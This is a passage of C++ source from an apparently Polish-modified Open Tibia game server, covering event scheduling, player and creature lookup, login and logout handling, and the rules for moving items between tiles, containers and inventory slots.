    bool isEmpty = eventList.empty();
    eventList.push(event);

    if(isEmpty || *event < *eventList.top())
        do_signal = true;

    /*
    if (eventList.empty() ||  *event < *eventList.top())
    do_signal = true;
    */

    OTSYS_THREAD_UNLOCK(eventLock, "addEvent()")

    if (do_signal)
        OTSYS_THREAD_SIGNAL_SEND(eventSignal);

    return event->getEventId();
}

bool Game::stopEvent(uint32_t eventid)
{
    if(eventid == 0)
        return false;

    OTSYS_THREAD_LOCK(eventLock, "stopEvent()")

    std::map<uint32_t, SchedulerTask*>::iterator it = eventIdMap.find(eventid);
    if(it != eventIdMap.end())
    {

#ifdef __DEBUG__EVENTSCHEDULER__
        std::cout << "stopEvent - eventid: " << eventid << "/" << it->second->getEventId() << std::endl;
#endif

        //it->second->setEventId(0); //invalidate the event
        eventIdMap.erase(it);

        OTSYS_THREAD_UNLOCK(eventLock, "stopEvent()")
        return true;
    }

    OTSYS_THREAD_UNLOCK(eventLock, "stopEvent()")
    return false;
}

/*****************************************************************************/

uint32_t Game::getPlayersOnline()
{
    return (uint32_t)Player::listPlayer.list.size();
};
uint32_t Game::getMonstersOnline()
{
    return (uint32_t)Monster::listMonster.list.size();
};
uint32_t Game::getNpcsOnline()
{
    return (uint32_t)Npc::listNpc.list.size();
};
uint32_t Game::getCreaturesOnline()
{
    return (uint32_t)listCreature.list.size();
};

Tile* Game::getTile(uint16_t _x, uint16_t _y, unsigned char _z)
{
    return map->getTile(_x, _y, _z);
}

Tile* Game::getTile(const Position& pos)
{
    return map->getTile(pos);
}

void Game::setTile(uint16_t _x, uint16_t _y, unsigned char _z, uint16_t groundId)
{
    map->setTile(_x, _y, _z, groundId);
}

Creature* Game::getCreatureByID(uint32_t id)
{
    if(id == 0)
        return NULL;

    AutoList<Creature>::listiterator it = listCreature.list.find(id);
    if(it != listCreature.list.end())
    {
        return (*it).second;
    }

    return NULL; //just in case the player doesnt exist
}

Player* Game::getPlayerByID(uint32_t id)
{
    if(id == 0)
        return NULL;

    AutoList<Player>::listiterator it = Player::listPlayer.list.find(id);
    if(it != Player::listPlayer.list.end())
    {
        return (*it).second;
    }

    return NULL; //just in case the player doesnt exist
}

Creature* Game::getCreatureByName(const std::string &s)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::getCreatureByName()");

    std::string txt1 = s;
    std::transform(txt1.begin(), txt1.end(), txt1.begin(), upchar);
    for(AutoList<Creature>::listiterator it = listCreature.list.begin(); it != listCreature.list.end(); ++it)
    {
        std::string txt2 = (*it).second->getName();
        std::transform(txt2.begin(), txt2.end(), txt2.begin(), upchar);
        if(txt1 == txt2)
            return it->second;
    }

    return NULL; //just in case the creature doesnt exist
}

Player* Game::getPlayerByName(const std::string &s)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::getPlayerByName()");

    std::string txt1 = s;
    std::transform(txt1.begin(), txt1.end(), txt1.begin(), upchar);
    for(AutoList<Player>::listiterator it = Player::listPlayer.list.begin(); it != Player::listPlayer.list.end(); ++it)
    {
        std::string txt2 = (*it).second->getName();
        std::transform(txt2.begin(), txt2.end(), txt2.begin(), upchar);
        if(txt1 == txt2)
            return it->second;
    }

    return NULL; //just in case the player doesnt exist
}
Creature* Game::getCreatureByPosition(int32_t x, int32_t y, int32_t z)
{
    for(AutoList<Creature>::listiterator it = listCreature.list.begin(); it != listCreature.list.end(); ++it)
    {
        if(it->second->pos.x == x && it->second->pos.y == y && it->second->pos.z == z)
            return it->second;
    }

    return NULL;
}

bool Game::placeCreature(Position &pos, Creature* c
#ifdef YUR_LOGIN_QUEUE
                         , int32_t* placeInQueue
#endif //YUR_LOGIN_QUEUE
                        )
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::placeCreature()");
    bool success = false;
    Player *p = dynamic_cast<Player*>(c);

#ifdef YUR_LOGIN_QUEUE
    if (!p || c->access >= g_config.ACCESS_ENTER ||
#ifdef YUR_PREMIUM_PROMOTION
            (p->isPremium() && !g_config.QUEUE_PREMMY) ||
#endif //YUR_PREMIUM_PROMOTION
            loginQueue.login(p->accountNumber, getPlayersOnline(), max_players, placeInQueue))
    {
#else //YUR_LOGIN_QUEUE
    if (!p || c->access >= g_config.ACCESS_ENTER || getPlayersOnline() < max_players)
    {
#endif //YUR_LOGIN_QUEUE

        success = map->placeCreature(pos, c);
        if(success)
        {
            c->useThing();

            c->setID();
            //std::cout << "place: " << c << " " << c->getID() << std::endl;
            listCreature.addList(c);
            c->addList();
            c->isRemoved = false;

            sendAddThing(NULL,c->pos,c);
//online on site.
            if (p)
            {
#ifdef HUCZU_RECORD
                checkRecord();
#endif
//Online system
                char godzina[15];
#ifdef USING_VISUAL_2005
                time_t czas = time(NULL);
                tm data;
                localtime_s(&data, &czas );
                strftime (godzina,sizeof(godzina),"%H:%M:%S",&data);
#else
                time_t czas;
                struct tm * data;
                time ( &czas );
                data = localtime ( &czas );
                strftime (godzina,sizeof(godzina),"%H:%M:%S",data);
#endif //USING_VISUAL_2005
                unsigned char ip[4];
                *(uint32_t*)&ip = p->getIP();
                std::cout << "[" << godzina << "] " << (uint32_t)getPlayersOnline() << " graczy online. " << p->getName() << " zaladowany. IP: " << (uint32_t)ip[0] << "." << (uint32_t)ip[1] << "." << (uint32_t)ip[2] << "." << (uint32_t)ip[3] << " ." << std::endl;
                vipLogin(p);
                p->mcCheck();
                IOPlayerSQL::getInstance()->updateOnlineStatus(p->guid, true);
#ifdef __MIZIAK_CREATURESCRIPTS__
                actions.creatureEvent("login", p, NULL, NULL, NULL);
#endif //__MIZIAK_CREATURESCRIPTS__
                checkShopItems(p);
                c->eventCheck = addEvent(makeTask(1000, std::bind2nd(std::mem_fun(&Game::checkCreature), c->getID())));
            }
            else
            {
                c->eventCheck = addEvent(makeTask(500, std::bind2nd(std::mem_fun(&Game::checkCreature), c->getID())));
            }

            //c->eventCheckAttacking = addEvent(makeTask(2000, std::bind2nd(std::mem_fun(&Game::checkCreatureAttacking), c->getID())));
        }
    }
    else
    {
        //we cant add the player, server is full
        success = false;
    }

    return success;
}

bool Game::removeCreature(Creature* c)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::removeCreature()");
    if(c->isRemoved == true)
        return false;
#ifdef __DEBUG__
    std::cout << "removing creature "<< std::endl;
#endif
#ifdef __MIZIAK_CREATURESCRIPTS__
    Player* pc = dynamic_cast<Player*>(c);
    if(pc)
        if(!pc->dieorlogout)
            actions.creatureEvent("logout", pc, NULL, NULL, NULL);
#endif //__MIZIAK_CREATURESCRIPTS__
    if(!removeThing(NULL,c->pos,c))
        return false;

    //std::cout << "remove: " << c << " " << c->getID() << std::endl;
    listCreature.removeList(c->getID());
    c->removeList();
    c->isRemoved = true;

    for(std::list<Creature*>::iterator cit = c->summons.begin(); cit != c->summons.end(); ++cit)
    {
        removeCreature(*cit);
    }

    stopEvent(c->eventCheck);
    stopEvent(c->eventCheckAttacking);
#ifdef HUCZU_FOLLOW
    stopEvent(c->eventCheckFollow);
#endif
    Player* player = dynamic_cast<Player*>(c);
    if(player)
    {
#ifdef HUCZU_SKULLS
        if(player->party != 0)
            LeaveParty(player);
#endif //HUCZU_SKULLS
        if(player->tradePartner != 0)
            playerCloseTrade(player);

        if(player->eventAutoWalk)
            stopEvent(player->eventAutoWalk);
#ifdef __MIZIAK_SUPERMANAS__
        if(player->eventManas)
            stopEvent(player->eventManas);
#endif
#ifdef HUCZU_RRV
        if(player->violationReport != "") // taki myk
            player->cancelPlayerViolation(); // to nam zamknie raporty otwarte i nie otwarte.
#endif
        g_chat.removeUserFromAllChannels(player);
        IOPlayerSQL::getInstance()->updateOnlineStatus(player->guid, false);
        if(!IOPlayerSQL::getInstance()->savePlayer(player))
            std::cout << "Error while saving player: " << player->getName() << std::endl;

        char godzina[15];
#ifdef USING_VISUAL_2005
        time_t czas = time(0);
        tm data;
        localtime_s(&data, &czas );
        strftime (godzina,sizeof(godzina),"%H:%M:%S",&data);
#else
        time_t czas;
        struct tm * data;
        time ( &czas );
        data = localtime ( &czas );
        strftime (godzina,sizeof(godzina),"%H:%M:%S",data);
#endif //USING_VISUAL_2005
        unsigned char ip[4];
        *(uint32_t*)&ip = player->getIP();
        std::cout << "[" << godzina << "] " << (uint32_t)getPlayersOnline() << " graczy online. " << player->getName() << " zostal usuniety. IP: " << (uint32_t)ip[0] << "." << (uint32_t)ip[1] << "." << (uint32_t)ip[2] << "." << (uint32_t)ip[3] << " ." << std::endl;
        vipLogout(c->getName());
    }

    if(player) //CHANGE onWalk
    {
        Tile* fromT = getTile(player->pos);
        if(fromT->ground)
            actions.luaWalkOff(player,player->pos,fromT->ground->getID(),fromT->ground->getUniqueId(),fromT->ground->getActionId());
    }
    this->FreeThing(c);
    return true;
}

void Game::thingMove(Creature *creature, Thing *thing,
                     uint16_t to_x, uint16_t to_y, unsigned char to_z, unsigned char count)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::thingMove() - 1");

    Tile *fromTile = map->getTile(thing->pos);

    if (fromTile)
    {
        int32_t oldstackpos = fromTile->getThingStackPos(thing);
        thingMoveInternal(creature, thing->pos.x, thing->pos.y, thing->pos.z, oldstackpos, 0, to_x, to_y, to_z, count);
    }
}


void Game::thingMove(Creature *creature, uint16_t from_x, uint16_t from_y, unsigned char from_z,
                     unsigned char stackPos, uint16_t itemid, uint16_t to_x, uint16_t to_y, unsigned char to_z, unsigned char count)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::thingMove() - 2");

    Tile *fromTile = getTile(from_x, from_y, from_z);
    if(!fromTile)
        return;

    Tile *toTile = getTile(to_x, to_y, to_z);
    if(!toTile)
        return;

#ifdef FIXY
    if (toTile->isHouse() && !fromTile->isHouse())
        return;
#endif //FIXY

    Thing* thing = fromTile->getThingByStackPos(stackPos);
    if(!thing)
        return;

    Item* item = dynamic_cast<Item*>(thing);

    if(item && (item->getID() != itemid || item != fromTile->getTopDownItem()))
        return;

    thingMoveInternal(creature, from_x, from_y, from_z, stackPos, itemid, to_x, to_y, to_z, count);
}

//container/inventory to container/inventory
void Game::thingMove(Player *player,
                     uint16_t from_cid, uint16_t from_slotid, uint16_t itemid, bool fromInventory,
                     uint16_t to_cid, uint16_t to_slotid, bool toInventory,
                     uint16_t count)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::thingMove() - 3");

    thingMoveInternal(player, from_cid, from_slotid, itemid, fromInventory,
                      to_cid, to_slotid, toInventory, count);
}

//container/inventory to ground
void Game::thingMove(Player *player,
                     unsigned char from_cid, unsigned char from_slotid, uint16_t itemid, bool fromInventory,
                     const Position& toPos, unsigned char count)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::thingMove() - 4");

#ifdef FIXY
    Tile *toTile = getTile(toPos.x, toPos.y, toPos.z);
    if(!toTile)
        return;

    if (player)
    {
        Tile *fromTile = getTile(player->pos);
        if(!fromTile->isHouse() && toTile->isHouse())
            return;
    }
#endif //FIXY

    thingMoveInternal(player, from_cid, from_slotid, itemid, fromInventory, toPos, count);
}

//ground to container/inventory
void Game::thingMove(Player *player,
                     const Position& fromPos, unsigned char stackPos, uint16_t itemid,
                     unsigned char to_cid, unsigned char to_slotid, bool toInventory,
                     unsigned char count)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::thingMove() - 5");
    thingMoveInternal(player, fromPos, stackPos, itemid, to_cid, to_slotid, toInventory, count);
}

/*ground -> ground*/
#ifdef FIXY
bool Game::onPrepareMoveThing(Creature* player, /*const*/ Thing* thing,
                              const Position& fromPos, const Position& toPos, int32_t count)
{
    const Creature* movingCreature = dynamic_cast<const Creature*>(thing);

    if ((player->access < g_config.ACCESS_REMOTE || dynamic_cast<const Player*>(thing)) &&
            ((abs(player->pos.x - fromPos.x) > 1) || (abs(player->pos.y - fromPos.y) > 1) || (player->pos.z != fromPos.z)))
    {
        player->sendCancel("Za daleko...");
        return false;
    }
    else if( ((abs(fromPos.x - toPos.x) > thing->throwRange) || (abs(fromPos.y - toPos.y) > thing->throwRange)
              || (fromPos.z != toPos.z)) && player->access >= g_config.ACCESS_PROTECT)
    {
        if(player == thing)
            teleport(player,toPos);
        else
            teleport(thing,toPos);
    }

    else if ((player->access < g_config.ACCESS_REMOTE || dynamic_cast<const Player*>(thing)) && ((abs(fromPos.x - toPos.x) > thing->throwRange || abs(fromPos.y - toPos.y) > thing->throwRange || (abs(fromPos.z - toPos.z+1) > thing->throwRange))))
    {
        player->sendCancel("Destination is out of reach.");
        return false;
    }


    else if(player->access < g_config.ACCESS_REMOTE && movingCreature && fromPos.z != toPos.z)
    {
        player->sendCancel("Za daleko...");
        return false;
    }

    else
    {
        const Item* item = dynamic_cast<const Item*>(thing);
        if(item)
        {
            Item *aitem = const_cast<Item*>(item);
            if(aitem->getOwner() != "" && player->getName() != aitem->getOwner() && (dynamic_cast<Player*>(player)->party == 0 || getPlayerByName(aitem->getOwner())->party == 0 || dynamic_cast<Player*>(player)->party != getPlayerByName(aitem->getOwner())->party))
            {
                std::stringstream info;
                if(aitem->getOwnerTime() > g_config.OWNER_TIME)
                {
                    info << "Nie jestes wlascicielem. Poczekaj 1 sekunde.";
                }
                else
                {
                    info << "Nie jestes wlascicielem. Poczekaj " << aitem->getOwnerTime() << (aitem->getOwnerTime()>4?" sekund.":(aitem->getOwnerTime()>1?" sekundy.":(aitem->getOwnerTime()>0?" sekunde.":" sekund.")));
                }
                player->sendCancel(info.str().c_str());
                return false;
            }
            int32_t blockstate = 0;
            if(item->isBlocking())
                blockstate |= BLOCK_SOLID;

            if(item->isPickupable() || !item->isNotMoveable())
                blockstate |= BLOCK_PICKUPABLE;

            if(blockstate != 0)
            {
                switch(map->canThrowObjectTo(fromPos, toPos, blockstate))
                {
                case RET_NOERROR:
                    return true;
                    break;

                case RET_CANNOTTHROW:
                    player->sendCancel("Nie mozesz tam rzucic.");
                    return false;
                    break;

                case RET_CREATUREBLOCK:
                case RET_NOTENOUGHROOM:
                    player->sendCancel("Przykro mi, nie ma miejsca.");
                    return false;
                    break;

                default:
                    player->sendCancel("Sorry not possible.");
                    return false;
                    break;
                }
            }
        }
    }

    return true;
}
#else //FIXY
bool Game::onPrepareMoveThing(Creature* player, const Thing* thing,
                              const Position& fromPos, const Position& toPos, int32_t count)
{
    if ((player->access < g_config.ACCESS_REMOTE || dynamic_cast<const Player*>(thing)) &&
            ((abs(player->pos.x - fromPos.x) > 1) || (abs(player->pos.y - fromPos.y) > 1) || (player->pos.z != fromPos.z)))
    {
        player->sendCancel("Za daleko...");
        return false;
    }
    else if ((player->access < g_config.ACCESS_REMOTE || dynamic_cast<const Player*>(thing)) &&
             ((abs(fromPos.x - toPos.x) > thing->throwRange) || (abs(fromPos.y - toPos.y) > thing->throwRange)
              || (fromPos.z != toPos.z) /*TODO: Make it possible to throw items to different floors ))*/
{
    player->sendCancel("Destination is out of reach.");
        return false;
    }
    else
    {
        const Item* item = dynamic_cast<const Item*>(thing);
        if(item)
        {
            int32_t blockstate = 0;
            if(item->isBlocking())
                blockstate |= BLOCK_SOLID;

            if(item->isPickupable() || !item->isNotMoveable())
                blockstate |= BLOCK_PICKUPABLE;

            if(blockstate != 0)
            {
                switch(map->canThrowObjectTo(fromPos, toPos, blockstate))
                {
                case RET_NOERROR:
                    return true;
                    break;

                case RET_CANNOTTHROW:
                    player->sendCancel("Nie mozesz tam rzucic.");
                    return false;
                    break;

                case RET_CREATUREBLOCK:
                case RET_NOTENOUGHROOM:
                    player->sendCancel("Przykro mi, nie ma miejsca.");
                    return false;
                    break;

                default:
                    player->sendCancel("Sorry not possible.");
                    return false;
                    break;
                }
            }
        }
    }
    return true;
}
#endif //FIXY
/*ground -> ground*/
bool Game::onPrepareMoveThing(Creature* creature, const Thing* thing,
                              const Tile* fromTile, const Tile *toTile, int32_t count)
{
    const Player* player = dynamic_cast<const Player*>(creature);

    const Item *item = dynamic_cast<const Item*>(thing);
    const Creature* movingCreature = dynamic_cast<const Creature*>(thing);
    const Player* movingPlayer = dynamic_cast<const Player*>(thing);

    /* if(movingCreature){
     addEvent(makeTask(2000, std::mem_fun(&Game::onPrepareMoveCreature, creature, movingCreature, fromTile, toTile))));
     }*/
    if(item && !item->canMovedTo(toTile))
    {
        creature->sendCancel("Sorry, not possible.");
        return false;
    }
    else if(movingCreature && !movingCreature->canMovedTo(toTile))
    {
        if(player)
        {
            player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
            player->sendCancelWalk();
        }

        return false;
    }
    else if(!movingPlayer && toTile && toTile->floorChange())
    {
        creature->sendCancel("Sorry, not possible.");
        return false;
    }
    else if(movingCreature && toTile && !toTile->ground)
    {
        if(player)
        {
            player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
            player->sendCancelWalk();
        }

        return false;
    }

    if (fromTile && fromTile->splash == thing && fromTile->splash->isNotMoveable())
    {
        creature->sendCancel("You cannot move this object.");
#ifdef __DEBUG__
        cout << creature->getName() << " is trying to move a splash item!" << std::endl;
#endif
        return false;
    }
    else if (item && item->isNotMoveable())
    {
        creature->sendCancel("You cannot move this object.");
#ifdef __DEBUG__
        cout << creature->getName() << " is trying to move an unmoveable item!" << std::endl;
#endif
        return false;
    }

#ifdef TLM_HOUSE_SYSTEM
    if (item && toTile && toTile->isHouse())
    {
        const Container* container = dynamic_cast<const Container*>(item);
        int32_t moving = container? container->getItemHoldingCount() : 1;

        if (moving + toTile->getItemHoldingCount() > g_config.MAX_HOUSE_TILE_ITEMS)
        {
            creature->sendCancel("Nie mozesz polozyc juz wiecej itemow na tym sqm.");
            return false;
        }
    }
#endif //TLM_HOUSE_SYSTEM
    return true; //return thing->canMovedTo(toTile);
}

/*inventory -> container*/
bool Game::onPrepareMoveThing(Player* player, const Item* fromItem, slots_t fromSlot,
                              const Container* toContainer, const Item* toItem, int32_t count)
{
    if(!fromItem->isPickupable())
    {
        player->sendCancel("Sorry, not possible.");
        return false;
    }
    else
    {
        const Container *itemContainer = dynamic_cast<const Container*>(fromItem);
        if(itemContainer)
        {
            if(itemContainer->isHoldingItem(toContainer) || (toContainer == itemContainer))
            {
                player->sendCancel("To jest niemozliwe!");
                return false;
            }
        }

        if((!fromItem->isStackable() || !toItem || fromItem->getID() != toItem->getID() || toItem->getItemCountOrSubtype() >= 100) && toContainer->size() + 1 > toContainer->capacity())
        {
            player->sendCancel("Przykro mi, nie ma miejsca.");
            return false;
        }

        Container const *topContainer = toContainer->getTopParent();
        int32_t itemsToadd;
        if(!topContainer)
            topContainer = toContainer;

        Container const *fromContainer = dynamic_cast<const Container*>(fromItem);
        if(fromContainer)
            itemsToadd = fromContainer->getItemHoldingCount() + 1;
        else
            itemsToadd = 1;

        if(topContainer->depot != 0 && player->max_depot_items != 0 && topContainer->getItemHoldingCount() + itemsToadd >= player->max_depot_items)
        {
            player->sendCancel("Nie mozesz polozyc wiecej przedmiotow w depo.");
            return false;
        }
    }
    return true;
}

/*container -> container*/
/*ground -> container*/
bool Game::onPrepareMoveThing(Player* player,
                              const Position& fromPos, const Container* fromContainer, const Item* fromItem,
                              const Position& toPos, const Container* toContainer, const Item* toItem, int32_t count)
{
    if (player->access < g_config.ACCESS_REMOTE &&
            ((abs(player->pos.x - fromPos.x) > 1) || (abs(player->pos.y - fromPos.y) > 1) || (player->pos.z != fromPos.z)))
    {
        player->sendCancel("Za daleko...");
        return false;
    }
    else if (player->access < g_config.ACCESS_REMOTE &&
             ((abs(fromPos.x - toPos.x) > fromItem->throwRange) || (abs(fromPos.y - toPos.y) > fromItem->throwRange)
              || (fromPos.z != toPos.z)))
    {
        player->sendCancel("Destination is out of reach.");
        return false;
    }

    if(!fromItem->isPickupable())
    {
        player->sendCancel("You cannot move this object.");
        return false;
    }
    else
    {
        if((!fromItem->isStackable() || !toItem || fromItem->getID() != toItem->getID() || toItem->getItemCountOrSubtype() >= 100) && toContainer->size() + 1 > toContainer->capacity())
        {
            player->sendCancel("Przykro mi, nie ma miejsca.");
            return false;
        }

        const Container *itemContainer = dynamic_cast<const Container*>(fromItem);
        if(itemContainer)
        {
            if(itemContainer->isHoldingItem(toContainer) || (toContainer == itemContainer) || (fromContainer && fromContainer == itemContainer))
            {
                player->sendCancel("To jest niemozliwe!");
                return false;
            }
        }

        double itemWeight = (fromItem->isStackable() ? Item::items[fromItem->getID()].weight * std::max(1, count) : fromItem->getWeight());
        if((!fromContainer || !player->isHoldingContainer(fromContainer)) && player->isHoldingContainer(toContainer))
        {
            if(player->access < g_config.ACCESS_PROTECT && player->getFreeCapacity() < itemWeight)
            {
                player->sendCancel("Ten przedmiot jest za ciezki.");
                return false;
            }
        }

        Container const *topContainer = toContainer->getTopParent();
        int32_t itemsToadd;
        if(!topContainer)
            topContainer = toContainer;

        Container const *fromContainer = dynamic_cast<const Container*>(fromItem);
        if(fromContainer)
            itemsToadd = fromContainer->getItemHoldingCount() + 1;
        else
            itemsToadd = 1;

        if(topContainer->depot != 0 && player->max_depot_items != 0 && topContainer->getItemHoldingCount() >= player->max_depot_items)
        {
            player->sendCancel("Nie mozesz polozyc wiecej przedmiotow w depo.");
            return false;
        }
    }
    return true;
}

/*ground -> ground*/
bool Game::onPrepareMoveCreature(Creature *creature, const Creature* creatureMoving,
                                 const Tile *fromTile, const Tile *toTile)
{
    const Player* playerMoving = dynamic_cast<const Player*>(creatureMoving);
    Player* player = dynamic_cast<Player*>(creature);

    if (creature->access < g_config.ACCESS_PROTECT && creature != creatureMoving && !creatureMoving->isPushable())
    {
        creature->sendCancel("Sorry, not possible.");
        return false;
    }
    if(!toTile)
    {
        if(creature == creatureMoving && player)
        {
            player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
            player->sendCancelWalk();
        }

        return false;
    }
    else if (playerMoving && fromTile->isHouse() && !toTile->isHouse() && playerMoving->tradePartner != 0)
    {
        playerCloseTrade(player);
    }
    else if (playerMoving && toTile->isPz() && playerMoving->pzLocked)
    {
        if (creature == creatureMoving && creature->pzLocked)
        {

            if(player)
            {
                player->sendTextMessage(MSG_SMALLINFO, "You can not enter a protection zone after attacking another player.");
                player->sendCancelWalk();
            }

            return false;
        }
        else if (playerMoving->pzLocked)
        {
            creature->sendCancel("Sorry, not possible.");
            return false;
        }
    }
    else if (playerMoving && fromTile->isPz() && !toTile->isPz() && creature != creatureMoving)
    {
        creature->sendCancel("Sorry, not possible.");
        return false;
    }
    else if(creature != creatureMoving && toTile->floorChange())
    {
        creature->sendCancel("Sorry, not possible.");
        return false;
    }
    else if(creature != creatureMoving && toTile->getTeleportItem())
    {
        creature->sendCancel("Sorry, not possible.");
        return false;
    }
    return true;
}

/*ground -> inventory*/
bool Game::onPrepareMoveThing(Player *player, const Position& fromPos, const Item *item,
                              slots_t toSlot, int32_t count)
{
    if (player->access < g_config.ACCESS_REMOTE &&
            ((abs(player->pos.x - fromPos.x) > 1) || (abs(player->pos.y - fromPos.y) > 1) || (player->pos.z != fromPos.z)))
    {
        player->sendCancel("Za daleko...");
        return false;
    }
    else if(!item->isPickupable())
    {
        player->sendCancel("You cannot move this object.");
        return false;
    }

    double itemWeight = (item->isStackable() ? Item::items[item->getID()].weight * std::max(1, count) : item->getWeight());
    if(player->access < g_config.ACCESS_PROTECT && player->getFreeCapacity() < itemWeight)
    {
        player->sendCancel("Ten przedmiot jest za ciezki.");
        return false;
    }

    return true;
}

/*inventory -> inventory*/
bool Game::onPrepareMoveThing(Player *player, slots_t fromSlot, const Item *fromItem,
                              slots_t toSlot, const Item *toItem, int32_t count)
{
    if(toItem && (!toItem->isStackable() || toItem->getID() != fromItem->getID()))
    {
        player->sendCancel("Przyko mi, nie ma miejsca.");
        return false;
    }

    return true;
}

/*container -> inventory*/
bool Game::onPrepareMoveThing(Player *player, const Container *fromContainer, const Item *fromItem,
                              slots_t toSlot, const Item *toItem, int32_t count)
{
    if(toItem && (!toItem->isStackable() || toItem->getID() != fromItem->getID()))
    {
        player->sendCancel("Przyko mi, nie ma miejsca.");
        return false;
    }

    double itemWeight = (fromItem->isStackable() ? Item::items[fromItem->getID()].weight * std::max(1, count) : fromItem->getWeight());
    if(player->access < g_config.ACCESS_PROTECT && !player->isHoldingContainer(fromContainer) &&
            player->getFreeCapacity() < itemWeight)
    {
        player->sendCancel("Ten przedmiot jest za ciezki.");
        return false;
    }

    return true;
}

/*->inventory*/
bool Game::onPrepareMoveThing(Player *player, const Item *item,
                              slots_t toSlot, int32_t count)
{
    switch(toSlot)
    {
    case SLOT_HEAD:
        if(item->getSlotPosition() & SLOTP_HEAD)
            return true;
        break;
    case SLOT_NECKLACE:
        if(item->getSlotPosition() & SLOTP_NECKLACE)
            return true;
        break;
    case SLOT_BACKPACK:
        if(item->getSlotPosition() & SLOTP_BACKPACK)
            return true;
        break;
    case SLOT_ARMOR:
        if(item->getSlotPosition() & SLOTP_ARMOR)
            return true;
        break;
    case SLOT_RIGHT:
        if(item->getSlotPosition() & SLOTP_RIGHT)
        {
#ifdef FIXY
            if(item && item->isWeapon() && item->getWeaponType() != SHIELD && player->items[SLOT_LEFT] != NULL && player->items[SLOT_LEFT]->isWeapon() && player->items[SLOT_LEFT]->getWeaponType() != SHIELD && !item->isStackable())
            {
                player->sendCancel("Mozesz uzywac tylko jednej broni.");
                return false;
            }
            if(item && item->isWeapon() && item->getWeaponType() != SHIELD && player->items[SLOT_RIGHT] != NULL && player->items[SLOT_RIGHT]->isWeapon() && player->items[SLOT_RIGHT]->getWeaponType() != SHIELD && !item->isStackable())
            {
                player->sendCancel("Mozesz uzywac tylko jednej broni.");
                return false;
            }
#endif //FIXY
            if(item->getSlotPosition() & SLOTP_TWO_HAND)
            {
                if(player->items[SLOT_LEFT] != NULL)
                {
                    player->sendCancel("Pierw usun dwu-reczny przedmiot.");
                    return false;
                }
                return true	;
            }
            else
            {
                if(player->items[SLOT_LEFT])
                {
#ifdef FIXY
                    if(item && item->isWeapon() && item->getWeaponType() != SHIELD && player->items[SLOT_LEFT] != NULL && player->items[SLOT_LEFT]->isWeapon() && player->items[SLOT_LEFT]->getWeaponType() != SHIELD && !item->isStackable())
                    {
                        player->sendCancel("Mozesz uzywac tylko jednej broni.");
                        return false;
                    }
                    if(item && item->isWeapon() && item->getWeaponType() != SHIELD && player->items[SLOT_RIGHT] != NULL && player->items[SLOT_RIGHT]->isWeapon() && player->items[SLOT_RIGHT]->getWeaponType() != SHIELD && !item->isStackable())
                    {
                        player->sendCancel("Mozesz uzywac tylko jednej broni.");
                        return false;
                    }
#endif //FIXY
                    if(player->items[SLOT_LEFT]->getSlotPosition() & SLOTP_TWO_HAND)
                    {
                        player->sendCancel("Pierw usun dwu-reczny przedmiot.");
                        return false;
                    }
                    return true;
                }
                return true;
            }
        }
        break;
    case SLOT_LEFT:
        if(item->getSlotPosition() & SLOTP_LEFT)
        {
#ifdef FIXY
            if(item && item->isWeapon() && item->getWeaponType() != SHIELD && player->items[SLOT_LEFT] != NULL && player->items[SLOT_LEFT]->isWeapon() && player->items[SLOT_LEFT]->getWeaponType() != SHIELD && !item->isStackable())
            {
                player->sendCancel("Mozesz uzywac tylko jednej broni.");
                return false;
            }
            if(item && item->isWeapon() && item->getWeaponType() != SHIELD && player->items[SLOT_RIGHT] != NULL && player->items[SLOT_RIGHT]->isWeapon() && player->items[SLOT_RIGHT]->getWeaponType() != SHIELD && !item->isStackable())
            {
                player->sendCancel("Mozesz uzywac tylko jednej broni.");
                return false;
            }
#endif //FIXY
            if(item->getSlotPosition() & SLOTP_TWO_HAND)
            {
                if(player->items[SLOT_RIGHT] != NULL)
                {
                    player->sendCancel("Pierw usun dwu-reczny przedmiot.");
                    return false;
                }
                return true	;
            }
            else
            {
                if(player->items[SLOT_RIGHT])
                {
#ifdef FIXY
                    if(item && item->isWeapon() && item->getWeaponType() != SHIELD && player->items[SLOT_LEFT] != NULL && player->items[SLOT_LEFT]->isWeapon() && player->items[SLOT_LEFT]->getWeaponType() != SHIELD && !item->isStackable())
                    {
                        player->sendCancel("Mozesz uzywac tylko jednej broni.");
                        return false;
                    }
                    if(item && item->isWeapon() && item->getWeaponType() != SHIELD && player->items[SLOT_RIGHT] != NULL && player->items[SLOT_RIGHT]->isWeapon() && player->items[SLOT_RIGHT]->getWeaponType() != SHIELD && !item->isStackable())
                    {
                        player->sendCancel("Mozesz uzywac tylko jednej broni.");
                        return false;
                    }
#endif //FIXY
                    if(player->items[SLOT_RIGHT]->getSlotPosition() & SLOTP_TWO_HAND)
                    {
                        player->sendCancel("Pierw usun dwu-reczny przedmiot.");
                        return false;
                    }
                    return true;
                }
                return true;
            }
        }
        break;
    case SLOT_LEGS:
        if(item->getSlotPosition() & SLOTP_LEGS)
            return true;
        break;
    case SLOT_FEET:
        if(item->getSlotPosition() & SLOTP_FEET)
            return true;
        break;
    case SLOT_RING:
        if(item->getSlotPosition() & SLOTP_RING)
            return true;
        break;
    case SLOT_AMMO:
        if(item->getSlotPosition() & SLOTP_AMMO)
            return true;
        break;
    }

    player->sendCancel("Nie mozesz polozyc tego przedmiotu tutaj.");
    return false;
}


//container/inventory to container/inventory
void Game::thingMoveInternal(Player *player,
                             uint16_t from_cid, uint16_t from_slotid, uint16_t itemid,
                             bool fromInventory,uint16_t to_cid, uint16_t to_slotid, bool toInventory,
                             uint16_t count)
{
    Container *fromContainer = NULL;
    Container *toContainer = NULL;
    Item *fromItem = NULL;
    Item *toItem = NULL;

    if(fromInventory)
    {
        fromItem = player->getItem(from_cid);
        fromContainer = dynamic_cast<Container *>(fromItem);
    }
    else
    {
        fromContainer = player->getContainer(from_cid);

        if(fromContainer)
        {
            if(from_slotid >= fromContainer->size())
                return;

            fromItem = fromContainer->getItem(from_slotid);
